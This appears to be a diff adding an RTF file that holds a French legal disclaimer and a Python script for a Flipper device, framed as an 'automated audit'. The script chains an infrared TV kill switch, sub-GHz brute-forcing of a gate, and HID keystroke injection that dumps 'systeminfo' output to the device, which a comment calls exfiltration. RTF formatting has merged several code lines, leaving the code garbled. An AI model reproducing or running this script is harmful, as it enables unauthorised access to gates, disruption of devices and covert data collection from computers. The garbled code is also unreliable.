@@ -1,0 +1,58 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2822
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\froman\fcharset0 TimesNewRomanPSMT;\f1\fmodern\fcharset0 CourierNewPSMT;}
+{\colortbl;\red255\green255\blue255;\red230\green0\blue6;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\cssrgb\c93333\c0\c0;\cssrgb\c0\c0\c0;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\li75\ri454\sl325\qj\partightenfactor0
+
+\f0\fs29\fsmilli14667 \cf2 \expnd0\expndtw0\kerning0
+Rappel L\'e9gal : Ces techniques sont puissantes. L'\'e9mission sur des fr\'e9quences interdites ou l'interaction avec des syst\'e8mes dont vous n'\'eates pas propri\'e9taire est ill\'e9gale. Ces scripts doivent \'eatre utilis\'e9s uniquement dans le cadre d'audits mandat\'e9s ou sur votre propre mat\'e9riel \'e0 des fins \'e9ducatives.
+\f1 \cf3 \
+\pard\pardeftab720\li67\partightenfactor0
+
+\fs24 \cf3 \
+\
+def \AppleTypeServices\AppleTypeServicesF65539 audit_sequence():\AppleTypeServices \
+\pard\pardeftab720\li643\sl264\partightenfactor0
+\cf3 flipper\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices =\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices FlipperClient('COM4') if not flipper.connect():\
+\pard\pardeftab720\li1220\partightenfactor0
+\AppleTypeServices\AppleTypeServicesF65539 \cf3 sys.exit(1)\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\partightenfactor0
+\cf3 print("=== D\'c9BUT DE L'AUDIT AUTOMATIS\'c9 \AppleTypeServices\AppleTypeServicesF65539 ===")\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\partightenfactor0
+\cf3 # 1. V\'e9rification \AppleTypeServices\AppleTypeServicesF65539 syst\'e8me\AppleTypeServices \
+\pard\pardeftab720\li643\ri8544\sl264\partightenfactor0
+\cf3 batt\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices =\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices flipper.send_cmd("power\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices info") if "charge: 10%" in batt:\
+\pard\pardeftab720\li1220\ri7540\sl264\partightenfactor0
+\cf3 print("[!]\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices Batterie\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices faible,\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices abandon.") \AppleTypeServices\AppleTypeServicesF65539 return\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\ri7540\sl264\partightenfactor0
+\cf3 #\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices 2.\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices Test\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices TV\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices (Infrarouge) \AppleTypeServices\AppleTypeServicesF65539 tv_kill_switch(flipper)\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\ri6961\sl264\partightenfactor0
+\cf3 #\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices 3.\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices Fuzzing\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices Portail\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices (Sub-GHz) \AppleTypeServices\AppleTypeServicesF65539 bruteforce_gate(flipper)\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\partightenfactor0
+\cf3 # 4. Injection HID sur le poste local (si branch\'e9 en \AppleTypeServices\AppleTypeServicesF65539 USB)\AppleTypeServices \
+\pard\pardeftab720\li643\ri3505\sl264\partightenfactor0
+\cf3 #\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices Exfiltration\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices d'infos\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices syst\'e8me\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices vers\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices un\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices fichier\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices texte\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices sur\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices le\AppleTypeServices\AppleTypeServicesF65539  \AppleTypeServices Flipper payload = "systeminfo > D:\\\\sys.txt"\
+\pard\pardeftab720\li643\partightenfactor0
+\cf3 inject_payload(flipper, payload, \AppleTypeServices\AppleTypeServicesF65539 'win')\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\partightenfactor0
+\cf3 print("=== AUDIT TERMIN\'c9 \AppleTypeServices\AppleTypeServicesF65539 ===")\AppleTypeServices \
+\AppleTypeServices\AppleTypeServicesF65539 flipper.close()\AppleTypeServices \
+\pard\pardeftab720\partightenfactor0
+\cf3 \'a0\
+\pard\pardeftab720\li643\fi-578\sl264\partightenfactor0
+\cf3 if \AppleTypeServices\AppleTypeServicesF65539 \ul \'a0\AppleTypeServices \ulnone name\AppleTypeServices\AppleTypeServicesF65539 \ul  \AppleTypeServices \ulnone == "\AppleTypeServices\AppleTypeServicesF65539 \ul  \AppleTypeServices \ulnone main\AppleTypeServices\AppleTypeServicesF65539 \ul  \AppleTypeServices \ulnone ": \AppleTypeServices\AppleTypeServicesF65539 audit_sequence()\AppleTypeServices \
+}
